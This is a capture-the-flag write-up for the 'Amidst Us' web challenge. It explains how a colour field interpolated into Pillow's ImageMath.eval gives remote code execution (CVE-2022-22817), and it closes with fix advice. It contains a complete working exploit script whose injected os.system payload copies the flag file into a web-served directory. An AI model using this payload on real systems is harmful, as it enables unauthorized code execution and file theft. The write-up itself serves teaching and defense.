## Overview

Amidst Us is an Easy Web challenge: a small Flask app that takes an uploaded image and
makes one background colour transparent. The interesting part is *how* it computes the
transparency — it builds a maths expression as a string and hands it to Pillow's
`ImageMath.eval()`. The background colour you provide is interpolated into that string,
and on Pillow 8.4.0 the evaluator runs with full Python builtins available. That turns a
"colour" field into [server-side code injection](https://cwe.mitre.org/data/definitions/94.html)
and remote code execution — [CVE-2022-22817](https://nvd.nist.gov/vuln/detail/CVE-2022-22817).

## The technique

The only endpoint that matters is `POST /api/alphafy`, which calls `make_alpha()`:

```python
def make_alpha(data):
    color = data.get('background', [255, 255, 255])      # attacker-controlled JSON list
    ...
    alpha = ImageMath.eval(
        f'''float(max( ... difference1(red_band, {color[0]}) ... ))''',   # f-string'd in
        difference1=lambda source, color: (source - color) / (255.0 - color),
        red_band=img_bands[0], ...
    )
```

`color` comes from the request body and is **f-string-interpolated** into the expression
string with no type check. So `color[0]` does not have to be a number — it can be any
Python expression, and `ImageMath.eval` will execute it.

Why it executes: in Pillow `< 9.0.0`, `ImageMath.eval(expr, args)` boils down to
`eval(expression, args)` with **no** `{"__builtins__": {}}` override. When you call
`eval(code, globals)` and `globals` has no `__builtins__` key, CPython auto-inserts the
real builtins — so `__import__`, `open`, `eval`, and `exec` are all reachable from inside
the supposedly maths-only expression. Pillow 9.0.0 fixed this by locking the namespace.

## Solution

Two practical details make the payload land:

1. The handler wraps everything in `try/except: return '', 400`, so the bug is **blind** —
   no output channel — and the challenge container blocks outbound network, so a reverse
   shell won't connect. Instead, copy the flag into the app's own **web-served static
   directory** and fetch it over HTTP.
2. `os.system(...)` returns the int `0`, which keeps the surrounding `difference1`
   arithmetic valid so the eval completes instead of throwing before the side effect runs.
   The `image` field just needs to be any valid base64 PNG so `Image.open(...)` succeeds
   and execution reaches the `ImageMath.eval` line.

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, base64, io, requests
from PIL import Image

target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:1337"
base = f"http://{target}"

buf = io.BytesIO()
Image.new("RGBA", (2, 2), (10, 20, 30, 255)).save(buf, format="PNG")
img_b64 = base64.b64encode(buf.getvalue()).decode()

rce = "__import__('os').system('cp /flag.txt /app/application/static/uploads/pwn.txt')"
payload = {"image": img_b64, "background": [rce, 255, 255]}

requests.post(f"{base}/api/alphafy", json=payload, timeout=15)
flag = requests.get(f"{base}/static/uploads/pwn.txt", timeout=15)
print("FLAG:", flag.text.strip())
```

Run it against the instance:

```bash
python3 solve.py <host>:<port>
# FLAG: HTB{...}
```

The `/api/alphafy` request returns `400` — that is expected. `os.system` already ran and
copied the flag before the later band maths failed, so `/static/uploads/pwn.txt` is
already populated.

## Why it worked

The app treated a structured input (a colour triple) as trusted and built executable code
from it by string interpolation, then ran that code through an evaluator that — in this
Pillow version — exposed the full Python builtins. There is no sandbox: the "maths
expression" is just Python source, and untrusted bytes flowed straight into it.

## Fix / defense

- **Upgrade Pillow to `>= 9.0.0`**, which restricts the `ImageMath.eval` namespace (newer
  releases replace the raw API with `lambda_eval` / `unsafe_eval`).
- **Never build the expression from request data.** Keep the expression a fixed literal
  and pass user values only as *bound operands*, never interpolated text:

  ```python
  if not all(isinstance(c, (int, float)) for c in color):
      abort(400)
  alpha = ImageMath.eval('difference1(red_band, c)',
      difference1=lambda s, c: (s - c) / (255.0 - c),
      red_band=band, c=float(color[0]))   # value bound, not f-string'd
  ```

- Validate that colour/threshold parameters are actually numeric before using them.
